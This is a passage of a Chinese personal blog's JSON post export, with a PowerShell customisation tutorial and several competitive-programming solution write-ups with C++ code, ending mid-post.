https://sxyugao.top/p/7a448387.html","categories":[{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"},{"name":"Linux","slug":"极客/Linux","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sxyugao.top/tags/Linux/"}]},{"title":"美化你的PowerShell","slug":"美化你的PowerShell","date":"2019-03-03T02:58:52.000Z","updated":"2023-07-19T17:12:43.615Z","comments":true,"path":"p/aa39dfc6.html","permalink":"https://sxyugao.top/p/aa39dfc6.html","excerpt":"前言 作为 Windows 用户，常羡慕 Linux 用户高端大气的终端。 其实，Windows 自带的 PowerShell 也十分的强大。 但是过于简陋的界面不知道劝退了多少用户，于是让我们来美化一下 PowerShell 吧。 以下教程环境均为 PowerShell 5.x。","text":"前言 作为 Windows 用户，常羡慕 Linux 用户高端大气的终端。 其实，Windows 自带的 PowerShell 也十分的强大。 但是过于简陋的界面不知道劝退了多少用户，于是让我们来美化一下 PowerShell 吧。 以下教程环境均为 PowerShell 5.x。 准备 PowerShell 5.x Windows10 用户请直接跳过这个步骤，因为 Windows10 内置了 PowerShell 5.x。 我们去官网下载 Windows Management Framework 5.1，选择对应的版本下载。 注意，请关注对应的系统前缀，别下载错了。 下载好以后如果是压缩包运行里面的.msu文件，不要使用.ps1来安装。 安装好以后重启即可。 安装 posh-git 折腾 PowerShell 的人大多有 Git 的需求，但是 PowerShell 默认不支持 Git，没有仓库显示和 tab 补全。这时候我们就需要额外的模块来提供这个功能。 执行以下命令安装 posh-git： 1Install-Module posh-git -Scope CurrentUser 它会提示你先安装 NuGet，直接选择“是”。 安装过程中可能会有这样的警告： 1234不受信任的存储库你正在从不受信任的存储库安装模块。如果你信任该存储库，请通过运行 Set-PSRepositorycmdlet 更改其 InstallationPolicy 值。是否确实要从“PSGallery”安装模块?[Y] 是(Y) [A] 全是(A) [N] 否(N) [L] 全否(L) [S] 暂停(S) [?] 帮助 直接选“是”，如果你觉得这个警告烦人，直接执行以下代码信任该仓库即可： 1Set-PSRepository -Name PSGallery -InstallationPolicy Trusted 执行以下命令引入 posh-git： 1Import-Module posh-git 可能会有以下的错误： 12因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。 不要紧，更改一下执行权限： 1Set-ExecutionPolicy -Scope CurrentUser Bypass 再引入 posh-git，然后就能体验到 git 的 tab 补全了。 安装 DirColors 注意，此模块笔者在 Windows7 环境下体验不佳，不推荐非 Windows10 用户使用。 Linux 下的 ls 命令支持对不同文件进行高亮，PowerShell 肯定不能少了这个功能。 我们执行以下命令安装并引入 DirColors： 12Install-Module DirColors -Scope CurrentUserImport-Module DirColors 你还能自定义高亮格式，使用以下代码来引入配置文件： 1Update-DirColors 配置文件的路径 安装 oh-my-posh 用过 Linux 的人基本都用过神器 oh-my-zsh，而 PowerShell 也有类似的模块 oh-my-posh。oh-my-posh 提供了一个和 oh-my-zsh 类似的界面，颜值满分。 执行以下命令安装并引入 oh-my-posh，推荐使用代理： 12Install-Module oh-my-posh -Scope CurrentUserImport-Module oh-my-posh oh-my-posh 的 git 功能依赖 posh-git，请务必先安装 posh-git！ 在最新版本的 oh-my-posh 是一个独立的应用程序，上面的模组只是用来把这个独立的应用程序引入的。 可以通过以下方式安装： 1、winget install JanDeDobbeleer.OhMyPosh -s winget 2、在 Microsoft store 里直接搜索安装 主题可以通过 Get-PoshThemes 命令来获得主题目录，然后去 Github 上下载喜欢的主题放到目录里。 使用以下命令来切换 oh-my-posh 的主题： 123Set-PoshPrompt -Theme robbyrussell# 这个是 oh-my-zsh 的默认主题# 更多主题参见 https://ohmyposh.dev/docs/themes 一个漂亮的界面就出现在你面前了。 使用 Cmder 笔者在 Windows7 下使用 oh-my-posh 出现了显示问题，怀疑是因为自带的界面过于陈旧，使用 Cmder 就解决了。 去官网下载 Cmder，哪个版本都无所谓。 在解压目录下运行Cmder.exe /REGISTER ALL注册右键菜单，就能在任何目录下使用 Cmder 了。 设置默认启动为 PowerShell，Cmder 的设置就请读者自行搜索，笔者在此不再赘述。 安装 PSReadLine 有了漂亮的 shell，为什么不来语法高亮呢？ PSReadLine 正是为 PowerShell 提供命令行高亮的模块。 使用以下命令安装并引入 PSReadLine： 12Install-Module PSReadLine -Scope CurrentUserImport-Module PSReadLine 试着打几句命令，感受一下代码高亮吧。 2021.9.25 Updated 似乎高版本 PowerShell 自带 PSReadLine2.0。 安装字体 可能你在上一步尝试使用其他主题的时候就发现有一些奇怪的字符无法显示，这是因为系统缺失相应的字体。 执行以下代码来安装 Powerline 字体： 123git clone https://github.com/powerline/fonts.gitcd .\\fonts\\.\\install.ps1 安装好后执行以下代码删除多余文件： 12cd ..Remove-Item -Force .\\fonts\\ 打开你的 PowerShell 界面，在标题栏右键选中“默认值”，在“字体”选项中使用著名的“逮虾户”字体 (DejaVu Sans Mono for Powerline)。 当然你也可以根据自己的喜好来安装自己喜欢的字体，比如更纱黑体 (Sarasa Mono SC，后缀含义为等宽、中文)。更纱黑体内置了 Powerline 字体，字形很纤细，看上去也很舒服。 窗口透明度和配色 这个设置是针对默认命令行窗口的，和前文介绍的 Cmder 无关。 笔者在 Windows7 环境下体验不佳，不推荐非 Windows10 用户使用。 Linux 下的终端有着炫酷的配色，全局呼出终端时半透明的窗口也显得逼格满满。 其实，Windows 的终端也能那么炫酷。 打开 PowerShell，在标题栏右键选中“默认值”，在“颜色”选项中设置“不透明度”，透明窗口就设置成功了。 配色方案的话，我们下载微软官方的工具ColorTool来配置。 解压后在当前目录下执行.\\colortool -b campbell，即可把终端配色改为campbell。但是如果 ColorTool 自带的配色方案不喜欢怎么办？不要紧，这个小工具支持 itermcolor 格式，我们可以在 iTerm2 Color Schemes 挑选喜欢的配色主题，下载以后放置在 ColorTool 的 schemes 文件夹下，执行.\\colortool -b 主题名即可。 配置 PROFILE 我们的美化基本完成了，让我们理一理现在我们启动 PowerShell 后的操作： 123456Import-Module posh-gitImport-Module DirColorsUpdate-DirColors 配置文件的路径 # 若没有可以忽略该行Import-Module oh-my-poshSet-PoshPrompt -Theme 你自己喜欢的主题Import-Module PSReadLine 每次都这么打一遍是不是很繁琐？还好 PowerShell 为我们提供了 PROFILE。 在 PowerShell 里键入以下命令： 1$PROFILE 发现输出了一个文件的目录，直接用文本编辑器打开它，输入刚才引入模块的命令，保存并退出。 现在你每次打开 PowerShell 就会先引入 PROFILE 里的命令，节约了大量时间。 如果你自己有其他的需求，自行添加即可。 Screenfetch Linux 装机以后必晒图之一就是 screenfetch 了，想不到在 Windows 下也有这种东西。 执行以下命令安装 screenfetch： 1Install-Module windows-screenfetch -Scope CurrentUser 令人震惊的是这个模块居然不需要 Import。。 安装好以后直接输入 Screenfetch 就可以看到效果了，十分炫酷。 2020.10.4 Updated 突然发现这玩意有 Bug，花了点时间修完，有空去开个 PR。 不过像我这么鸽，不知道要到什么时候。 最终成果 这是我的辣鸡电脑，分辨率不高，将就看一下吧。","categories":[{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"},{"name":"Windows","slug":"极客/Windows","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/Windows/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sxyugao.top/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"PowerShell","slug":"PowerShell","permalink":"https://sxyugao.top/tags/PowerShell/"}]},{"title":"洛谷P3613 - 睡觉困难综合征","slug":"洛谷P3613-睡觉困难综合征","date":"2019-02-27T23:46:19.000Z","updated":"2022-01-07T13:57:23.228Z","comments":true,"path":"p/6e0912cc.html","permalink":"https://sxyugao.top/p/6e0912cc.html","excerpt":"首先我们要知道这道题的原型是「NOI2014」起床困难综合症。 总是有出题人喜欢把序列上用线段树解决的题目出到树上，让选手强行写个树链剖分或树分治或某种动态树数据结构。 序列问题转化为树上问题，很容易想到树链剖分，直接上板子。","text":"首先我们要知道这道题的原型是「NOI2014」起床困难综合症。 总是有出题人喜欢把序列上用线段树解决的题目出到树上，让选手强行写个树链剖分或树分治或某种动态树数据结构。 序列问题转化为树上问题，很容易想到树链剖分，直接上板子。 统计答案时因为二进制的特殊性质，后面每一位都选 1 都不大于这一位选 1，所以直接贪心即可。 注意到题面里询问的 x，y 是有方向性的，我们还要维护反向的状态。 但是如果每一位单独维护的话，时间复杂度爆炸，考虑把这些信息压进一个 unsigned long long 里。 这样的话怎么维护信息呢？我们定义一个结构体表示这段进来为 0/1 时出来的情况，不难发现如果这一位出来是 1 只有这么几种情况：左儿子进来是 0，出来是 0，右儿子进来是 0，出来是 1；左儿子进来是 1，出来是 0，右儿子进来是 0，出来是 1；左儿子进来是 0，出来是 1，右儿子进来是 1，出来是 1；左儿子进来是 1，出来是 1，右儿子进来是 1，出来是 1。 用 C++表示就是： 12ans.x0 = (x0 &amp; b.x1) | ((~x0) &amp; b.x0);ans.x1 = (x1 &amp; b.x1) | ((~x1) &amp; b.x0); 可见自然语言的繁琐 代码中用到了一个小技巧——重载运算符，这个能使代码更加简洁易懂，提升代码复用性。 以下就是冗长的代码了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178#include &lt;cstdio&gt;#include &lt;iostream&gt;using namespace std;typedef unsigned long long ull;#define gc c = getchar()ull read() &#123; ull x = 0, f = 1; char gc; for (; !isdigit(c); gc) if (c == &#x27;-&#x27;) f = -1; for (; isdigit(c); gc) x = x * 10 + c - &#x27;0&#x27;; return x * f;&#125;#undef gcconst int N = 1e5 + 5;int nedge, head[N];struct Edge &#123; int to, nxt;&#125; edge[N &lt;&lt; 1];void add(int x, int y) &#123; edge[++nedge].to = y; edge[nedge].nxt = head[x]; head[x] = nedge;&#125;int n, m, k;int dep[N], fa[N], son[N], siz[N];void dfs1(int x, int f) &#123; fa[x] = f; siz[x] = 1; dep[x] = dep[f] + 1; int mx = 0; for (int i = head[x]; i; i = edge[i].nxt) &#123; int y = edge[i].to; if (y == f) continue; dfs1(y, x); siz[x] += siz[y]; if (siz[y] &gt; mx) &#123; mx = siz[y]; son[x] = y; &#125; &#125;&#125;int tot, id[N], p[N], top[N];void dfs2(int x, int topf) &#123; top[x] = topf; id[x] = ++tot; p[tot] = x; if (!son[x]) return; dfs2(son[x], topf); for (int i = head[x]; i; i = edge[i].nxt) &#123; int y = edge[i].to; if (y == fa[x] || y == son[x]) continue; dfs2(y, y); &#125;&#125;struct Data &#123; ull x0, x1; Data() &#123; x0 = 0, x1 = ~0; &#125; Data(int opt, ull x) &#123; x0 = 0, x1 = ~0; if (opt == 1) &#123; x0 &amp;= x; x1 &amp;= x; &#125; if (opt == 2) &#123; x0 |= x; x1 |= x; &#125; if (opt == 3) &#123; x0 ^= x; x1 ^= x; &#125; &#125; Data operator+(const Data &amp;b) const &#123; Data ans; ans.x0 = (x0 &amp; b.x1) | ((~x0) &amp; b.x0); ans.x1 = (x1 &amp; b.x1) | ((~x1) &amp; b.x0); return ans; &#125; ull query(ull x) &#123; ull ans = 0; for (int i = k - 1; ~i; i--) &#123; if (x0 &amp; (1ull &lt;&lt; i)) &#123; ans += (1ull &lt;&lt; i); &#125; else if (x1 &amp; (1ull &lt;&lt; i) &amp;&amp; (1ull &lt;&lt; i) &lt;= x) &#123; x -= (1ull &lt;&lt; i); ans += (1ull &lt;&lt; i); &#125; &#125; return ans; &#125;&#125;;Data a[N];#define ls (k &lt;&lt; 1)#define rs (k &lt;&lt; 1 | 1)struct Segtree &#123; Data lv[N &lt;&lt; 2], rv[N &lt;&lt; 2]; void pushup(int k) &#123; lv[k] = lv[ls] + lv[rs]; rv[k] = rv[rs] + rv[ls]; &#125; void build(int k, int l, int r) &#123; if (l == r) &#123; lv[k] = rv[k] = a[p[l]]; return; &#125; int mid = (l + r) &gt;&gt; 1; build(ls, l, mid); build(rs, mid + 1, r); pushup(k); &#125; void modify(int k, int l, int r, int p, Data x) &#123; if (l == r) return (void)(lv[k] = rv[k] = x); int mid = (l + r) &gt;&gt; 1; if (p &lt;= mid) &#123; modify(ls, l, mid, p, x); &#125; else &#123; modify(rs, mid + 1, r, p, x); &#125; pushup(k); &#125; Data query(int k, int l, int r, int ql, int qr, bool opt) &#123; if (ql &lt;= l &amp;&amp; r &lt;= qr) return opt ? rv[k] : lv[k]; int mid = (l + r) &gt;&gt; 1; if (qr &lt;= mid) return query(ls, l, mid, ql, qr, opt); if (ql &gt; mid) return query(rs, mid + 1, r, ql, qr, opt); Data L = query(ls, l, mid, ql, qr, opt); Data R = query(rs, mid + 1, r, ql, qr, opt); if (opt) return R + L; return L + R; &#125;&#125; seg;#undef ls#undef rsData query(int x, int y) &#123; Data L, R; while (top[x] ^ top[y]) &#123; if (dep[top[x]] &gt; dep[top[y]]) &#123; L = L + seg.query(1, 1, n, id[top[x]], id[x], 1); x = fa[top[x]]; &#125; else &#123; R = seg.query(1, 1, n, id[top[y]], id[y], 0) + R; y = fa[top[y]]; &#125; &#125; Data tmp; if (dep[x] &gt; dep[y]) &#123; tmp = L + seg.query(1, 1, n, id[y], id[x], 1); tmp = tmp + R; return tmp; &#125; if (dep[x] &gt; dep[y]) return L + seg.query(1, 1, n, id[y], id[x], 1) + R; return L + seg.query(1, 1, n, id[x], id[y], 0) + R;&#125;int main() &#123; n = read(), m = read(), k = read(); for (int i = 1; i &lt;= n; i++) &#123; int opt = read(); ull x = read(); a[i] = Data(opt, x); &#125; for (int i = 1; i &lt; n; i++) &#123; int x = read(), y = read(); add(x, y), add(y, x); &#125; dfs1(1, 0), dfs2(1, 1); seg.build(1, 1, n); while (m--) &#123; int opt = read(), x = read(), y = read(); ull z = read(); if (opt == 2) &#123; seg.modify(1, 1, n, id[x], Data(y, z)); &#125; else &#123; Data ans = query(x, y); printf(&quot;%llu\\n&quot;, ans.query(z)); &#125; &#125;&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"}],"tags":[{"name":"树上问题","slug":"树上问题","permalink":"https://sxyugao.top/tags/%E6%A0%91%E4%B8%8A%E9%97%AE%E9%A2%98/"},{"name":"线段树","slug":"线段树","permalink":"https://sxyugao.top/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/"},{"name":"树链剖分","slug":"树链剖分","permalink":"https://sxyugao.top/tags/%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/"}]},{"title":"洛谷P4884 - 多少个1？","slug":"洛谷P4884-多少个1","date":"2018-09-26T23:32:03.000Z","updated":"2022-01-07T13:57:23.228Z","comments":true,"path":"p/cbf2e03c.html","permalink":"https://sxyugao.top/p/cbf2e03c.html","excerpt":"我们通过观察可以发现 $11\\cdots1$ 可以变化为 $\\frac{10^{n}-1}{9}$，于是根据取模的性质，我们可以把原式两边同乘九再加一，原式变为 $10^{n} \\equiv k \\cdot 9 + 1 \\pmod m$，发现这是个 BSGS 的标准式子，由于 $m$ 保证为质数，所以也不必用拓展 BSGS。","text":"我们通过观察可以发现 $11\\cdots1$ 可以变化为 $\\frac{10^{n}-1}{9}$，于是根据取模的性质，我们可以把原式两边同乘九再加一，原式变为 $10^{n} \\equiv k \\cdot 9 + 1 \\pmod m$，发现这是个 BSGS 的标准式子，由于 $m$ 保证为质数，所以也不必用拓展 BSGS。 然后愉快地交了一发，发现只有 80 分。再看一眼数据范围——中间过程相乘会爆 long long，所以我们需要快速乘来防止溢出。然而丧心病狂的出题人卡 $log_{n}$ 的快速乘，所以我们需要复杂度更优常数更小的快速乘： 1234567// 传说中复杂度更优的O(1)快速乘// 参考链接：https://zhuanlan.zhihu.com/p/31872064LL mul(LL a, LL b, LL P) &#123; LL L = a * (b &gt;&gt; 25LL) % P * (1LL &lt;&lt; 25) % P; LL R = a * (b &amp; ((1LL &lt;&lt; 25) - 1)) % P; return (L + R) % P;&#125; 看着这么高级其实就是利用了小学生都会的乘法分配律。 我们要计算 $a \\cdot b;mod;p$，设 $b=L+R$。 那么原式就变为 $a\\cdot(L+R);mod;p=((a\\cdot L);mod;p+(a\\cdot R);mod;p);mod;p$。 我们把 $L$ 钦定为 $b$ 的二进制前 $x$ 位，$R$ 为 $b$ 的后 $(64-x)$ 位。 就得到了以上的代码（以上这份代码 $x=25$）。 用上这样的快速乘就可以 AC 了。 以下为代码： 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;unordered_map&gt;using namespace std;typedef long long LL;LL k, m;// C++11标准及以上的哈希表unordered_mapunordered_map&lt;LL, LL&gt; Hash;LL mul(LL a, LL b, LL P) &#123; LL L = a * (b &gt;&gt; 25LL) % P * (1LL &lt;&lt; 25) % P; LL R = a * (b &amp; ((1LL &lt;&lt; 25) - 1)) % P; return (L + R) % P;&#125;LL pw(LL a, LL n, LL P) &#123; LL ans = 1; while (n) &#123; if (n &amp; 1) ans = mul(ans, a, P); a = mul(a, a, P); n &gt;&gt;= 1; &#125; return ans;&#125;LL BSGS(LL a, LL b, LL P) &#123; LL len = ceil(sqrt(P)); for (LL i = 0; i &lt; len; i++) Hash[mul(b, pw(a, i, P), P)] = i; a = pw(a, len, P); for (LL i = 0; i &lt;= len; i++) &#123; LL x = pw(a, i, P); LL j = Hash.count(x) ? Hash[x] : -1; if (j &gt;= 0 &amp;&amp; i * len - j &gt;= 0) return i * len - j; &#125; return -1;&#125;int main() &#123; scanf(&quot;%lld%lld&quot;, &amp;k, &amp;m); k = k * 9 + 1; k %= m; printf(&quot;%lld&quot;, BSGS(10, k, m));&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"}],"tags":[{"name":"数学","slug":"数学","permalink":"https://sxyugao.top/tags/%E6%95%B0%E5%AD%A6/"}]},{"title":"CF1037D - Valid BFS?","slug":"CF1037D-Valid-BFS","date":"2018-09-20T01:56:22.000Z","updated":"2022-01-07T13:57:23.225Z","comments":true,"path":"p/3396b077.html","permalink":"https://sxyugao.top/p/3396b077.html","excerpt":"作为一道英文题，我们先解释一下题意： 给你一棵树和它的一个 BFS 序，让你判断这个 BFS 序是否是一个从节点 1 开始的合法 BFS 序。 接下来我们进入正题。 第一眼看到这题时，大部分人都会想到，既然是树，那么它一定是一层一层地向下 BFS。 也就是说，BFS 序中越后出现的节点，它树上的深度肯定是大于它前面的节点的。 于是照这个思想打完后，发现 Wrong Answer 了。","text":"作为一道英文题，我们先解释一下题意： 给你一棵树和它的一个 BFS 序，让你判断这个 BFS 序是否是一个从节点 1 开始的合法 BFS 序。 接下来我们进入正题。 第一眼看到这题时，大部分人都会想到，既然是树，那么它一定是一层一层地向下 BFS。 也就是说，BFS 序中越后出现的节点，它树上的深度肯定是大于它前面的节点的。 于是照这个思想打完后，发现 Wrong Answer 了。 显然这个思路是有反例的，比如下图的情况： 输入给的 BFS 序为：1 5 2 3 4 6 如果根据原来的思路输出就是 Yes，然而正确的 BFS 序显然是 1 5 2 6 3 4 再仔细思考一下，发现合法的 BFS 序不仅要满足刚才的深度条件，而且满足每个节点的父亲在 BFS 序中的位置都要不晚于在它后面出现的节点父亲的位置。 这么看貌似时间复杂度是 $O(N^2)$ 的，如何减小复杂度呢？ 我们发现一个节点的子树是一个连续的区间，我们直接把每个节点重新编号为它父节点的编号，再把连续相同编号的节点的合并成一个节点即可。合并好以后有一个很好的性质，若输入的序列为合法的 BFS 序，重新编号后的序列元素在原序列中的位置单调递增。这样，时间复杂度就降到了 $O(n)$ 了。 以下为代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;#define gc c = getchar()int read()&#123; int x = 0, f = 1; char gc; for(; !isdigit(c); gc) if(c == &#x27;-&#x27;) f = -1; for(; isdigit(c); gc) x = x * 10 + c - &#x27;0&#x27;; return x * f;&#125;#undef gcconst int MAXN = 200005;int nedge, head[MAXN];struct Edge &#123; int to, nxt;&#125; edge[MAXN * 2];void add(int x, int y)&#123; edge[++nedge].to = y; edge[nedge].nxt = head[x]; head[x] = nedge;&#125;int d[MAXN], f[MAXN], a[MAXN], b[MAXN], id[MAXN];void dfs(int k, int fa)&#123; d[k] = d[fa] + 1; f[k] = fa; for(int i = head[k]; i; i = edge[i].nxt) &#123; int u = edge[i].to; if(u == fa) continue; dfs(u, k); &#125;&#125;int main()&#123; int n = read(); for(int i = 1; i &lt; n; i++) &#123; int x = read(), y = read(); add(x, y); add(y, x); &#125; dfs(1, 0); for(int i = 1; i &lt;= n; i++) a[i] = read(); for(int i = 1; i &lt;= n; i++) if(d[a[i]] &lt; d[a[i - 1]]) return puts(&quot;No&quot;), 0; // 以上为深度条件 for(int i = 1; i &lt;= n; i++) id[a[i]] = i; // 原序列中的位置直接开桶记录 for(int i = 1; i &lt;= n; i++) b[i] = f[a[i]]; // b为重新编号后的序列 int len = unique(b + 1, b + n + 1) - b - 1; for(int i = 1; i &lt;= len; i++) if(id[b[i]] &lt; id[b[i - 1]]) return puts(&quot;No&quot;), 0; // 以上为父节点条件 puts(&quot;Yes&quot;);&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"CodeForces","slug":"OI/CodeForces","permalink":"https://sxyugao.top/categories/OI/CodeForces/"}],"tags":[{"name":"BFS","slug":"BFS","permalink":"https://sxyugao.top/tags/BFS/"}]},{"title":"洛谷P2094 - 运输","slug":"洛谷P2094-运输","date":"2018-09-20T01:43:27.000Z","updated":"2022-01-07T13:57:23.228Z","comments":true,"path":"p/69c58062.html","permalink":"https://sxyugao.top/p/69c58062.html","excerpt":"这道题第一眼像是合并果子，我们考虑贪心。 我们先选择一种贪心策略：每次选当前最大的两个数合并，直到只剩最后一件物品。 接下来我们证明一下为什么这样是对的： 我们先想一想合并果子，那道题的贪心策略与这道题相反，每次选最小的两个数合并。考虑它为什么是对的——我们发现越先选的数对结果的贡献越大，为了使结果尽可能小，肯定是越小的先选越好。","text":"这道题第一眼像是合并果子，我们考虑贪心。 我们先选择一种贪心策略：每次选当前最大的两个数合并，直到只剩最后一件物品。 接下来我们证明一下为什么这样是对的： 我们先想一想合并果子，那道题的贪心策略与这道题相反，每次选最小的两个数合并。考虑它为什么是对的——我们发现越先选的数对结果的贡献越大，为了使结果尽可能小，肯定是越小的先选越好。 有了这题做基础，我们来考虑这道题。我们发现越先选的数被$k$除的次数也就越多，为了使结果尽可能小，肯定是让越大的数除 $k$ 的次数越多越好，自此，贪心策略证明完毕。 以下为代码： 1234567891011121314151617181920212223#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;iostream&gt;using namespace std;#define gc c = getchar()int read()&#123; int x = 0, f = 1; char gc; for(; !isdigit(c); gc) if(c == &#x27;-&#x27;) f = -1; for(; isdigit(c); gc) x = x * 10 + c - &#x27;0&#x27;; return x * f;&#125;#undef gcpriority_queue&lt;int&gt;q;int main()&#123; int n = read(), k = read(); for(int i = 1; i &lt;= n; i++) q.push(read()); while(q.size() &gt; 1) &#123; int x = q.top(); q.pop(); int y = q.top(); q.pop(); q.push((x + y) / k); &#125; printf(&quot;%d&quot;, q.top());&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"}],"tags":[{"name":"STL","slug":"STL","permalink":"https://sxyugao.top/tags/STL/"},{"name":"贪心","slug":"贪心","permalink":"https://sxyugao.top/tags/%E8%B4%AA%E5%BF%83/"}]},{"title":"洛谷P2988 - Test Taking","slug":"洛谷P2988-Test-Taking","date":"2018-06-21T17:10:00.000Z","updated":"2022-01-07T13:57:23.228Z","comments":true,"path":"p/1192747.html","permalink":"https://sxyugao.top/p/1192747.html","excerpt":"作为一道英文题，我们先解释一下题意： 给你一个长度为 $n$ 的 01 串，其中可能至少有 $t_{i}$ 个 1，问最后你给出一个 01 串可能和其匹配的最大长度。 接下来我们进入正题。 第一眼看见觉得是水题，对于每个 $t_{i}$ 枚举应该全 0 还是全 1，但是这显然可以找出反例来。","text":"作为一道英文题，我们先解释一下题意： 给你一个长度为 $n$ 的 01 串，其中可能至少有 $t_{i}$ 个 1，问最后你给出一个 01 串可能和其匹配的最大长度。 接下来我们进入正题。 第一眼看见觉得是水题，对于每个 $t_{i}$ 枚举应该全 0 还是全 1，但是这显然可以找出反例来。 那么我们应该怎么贪心呢？ 首先，我们先提出一个引理： 对于两个长度为 $n$ 的 01 串，$A$ 中 $a$ 个 1，$B$ 中 $b$ 个 1，任一排列中相同位置元素相同的数量至少为 $\\max\\{a+b-n,n-a-b\\}$。 接下来我们证明一下。 1、$a+b&gt;n$，即 $A$ 和 $B$ 匹配 1。 我们为了让相同元素尽可能少，考虑把 $A$ 中的 1 全移到前端，$B$ 中的 1 全移到后端，变成线段覆盖问题，重合部分为 $a+b-n$。 2、$a+b&lt;n$，即 $A$ 和 $B$ 匹配 0. 同理，我们考虑把 $A$ 中的 0 全移到前端，$B$ 中的 0 全移到后端，用同样的方法得出该情况下结果为 $n-a-b$。 3、$a+b=n$，显然答案为 0。 说完了引理，我们再接着讲题。 我们先将 $t$ 从小到大排序，设当前要匹配的 01 串为 $S$，其中有 $x$ 个 1。 对于每对 $t_{i-1},t_{i}$，我们肯定是拿 $S$ 和 $t_{i-1}$ 去匹配 0，和 $t_{i}$ 去匹配 1。 由引理得 $Ans=\\max\\{n-t_{i-1}-x,t_{i}+x-n\\}$。 当 $n-t_{i-1}-x \\geq t_{i}+x-n$ 时， 得 $Ans \\geq (t_{i}-t_{i-1})/2$ 同理当 $n-t_{i-1}-x \\geq t_{i}+x-n$ 时， 得 $Ans \\geq (t_{i}-t_{i-1})/2$ 综上所述，必有 $Ans \\geq (t_{i}-t_{i-1})/2$。 然后特判一下 $t_{1}$ 和 $t_{m}$，全选 0 或全选 1 的情况。 于是我们就可以愉快地切题了。 以下为代码： 123456789101112131415161718192021#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;#define gc c=getchar()int read() &#123; int x = 0, f = 1; char gc; for (; !isdigit(c); gc)if (c == &#x27;-&#x27;)f = -1; for (; isdigit(c); gc)x = x * 10 + c - &#x27;0&#x27;; return x * f;&#125;#undef gcint a[10005];int main() &#123; int n = read(), m = read(); for (int i = 1; i &lt;= m; i++)a[i] = read(); sort(a + 1, a + m + 1); int ans = max(a[1], n - a[m]); for (int i = 1; i &lt;= m; i++)ans = max(ans, (a[i + 1] - a[i]) / 2); printf(&quot;%d&quot;, ans);&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"}],"tags":[{"name":"贪心","slug":"贪心","permalink":"https://sxyugao.top/tags/%E8%B4%AA%E5%BF%83/"},{"name":"排序","slug":"排序","permalink":"https://sxyugao.top/tags/%E6%8E%92%E5%BA%8F/"}]},{"title":"洛谷P1351 - 联合权值","slug":"洛谷P1351-联合权值","date":"2018-06-18T18:05:00.000Z","updated":"2022-01-07T13:57:23.227Z","comments":true,"path":"p/b30e912f.html","permalink":"https://sxyugao.top/p/b30e912f.html","excerpt":"由题意得一个点对的联合权值是它们的点权相乘，而 2 个点形成点对的条件是距离为 2。 于是我们可以通过枚举这 2 个节点的公共点来算出以这个点为中心的权值和。 但是先枚举中心点再枚举其相邻的节点时间复杂度达到了 $O(n^3)$，我们不能承受。 经过观察发现，对于特定的点，它都要乘上除自己以外的所有点权，再相加。然后我们就可以先处理出点权和，统计答案的时候把自己减去即可。","text":"由题意得一个点对的联合权值是它们的点权相乘，而 2 个点形成点对的条件是距离为 2。 于是我们可以通过枚举这 2 个节点的公共点来算出以这个点为中心的权值和。 但是先枚举中心点再枚举其相邻的节点时间复杂度达到了 $O(n^3)$，我们不能承受。 经过观察发现，对于特定的点，它都要乘上除自己以外的所有点权，再相加。然后我们就可以先处理出点权和，统计答案的时候把自己减去即可。 虽然说题面里说是有序点对，但我们每次枚举的时候都定方向为当前点-&gt;其他点，所以最后也不需要再乘 2 了。 枚举每个点，再枚举相邻的每条边，复杂度看似是 $O(n^2)$，但由于树的度数为 $n-1$，实际复杂度应为 $O(n+m)$。 当然，这道题还有一个小小的坑点，题面里只说联合权值之和要取余，最大值却不需要取余，这个细节注意一下。 接下来上代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;cstdio&gt;#include &lt;iostream&gt;using namespace std;#define gc c = getchar()int read() &#123; int x = 0, f = 1; char gc; for (; !isdigit(c); gc) if (c == &#x27;-&#x27;) f = -1; for (; isdigit(c); gc) x = x * 10 + c - &#x27;0&#x27;; return x * f;&#125;#undef gcconst int MAXN = 200005;const int P = 10007;int n, Ans, ans, a[MAXN];int nedge, head[MAXN];struct Edge &#123; int to, nxt;&#125; edge[MAXN * 2]; // 边表2倍勿忘void add(int x, int y) &#123; edge[++nedge].to = y; edge[nedge].nxt = head[x]; head[x] = nedge;&#125;void calc(int k) &#123; // 关键函数 int Max = 0, Maxx = 0, sum = 0; // 